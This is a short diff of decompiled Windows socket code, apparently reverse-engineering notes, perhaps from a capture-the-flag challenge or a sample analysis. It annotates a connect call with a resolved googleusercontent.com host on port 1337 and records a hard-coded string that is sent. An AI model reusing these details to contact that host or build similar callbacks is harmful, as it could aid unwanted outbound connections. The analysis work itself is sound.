@@ -26,7 +26,7 @@ v6 = ((int (__cdecl *)(int, int *, int, int))ws2_32_WSAStartup(514, &v40, a3, a4
 // socket
     s = (const CHAR *)((int (__stdcall *)(_DWORD, _DWORD, _DWORD, __m128i *))ws2_32_socket)(*((_DWORD *)v39 + 1),*((_DWORD *)v39 + 2),*((_DWORD *)v39 + 3),v48);
     
-// conn addr above
+// conn 62.159.241.35.bc.googleusercontent.com:1337
 ((int (__stdcall *)(const CHAR *, _DWORD, _DWORD))ws2_32_connect)(s,*((_DWORD *)v35 + 6),*((_DWORD *)v35 + 4));
 
 // send: "KADMKLAFD:LSM$OPM@FLK:FM!N$@N$"
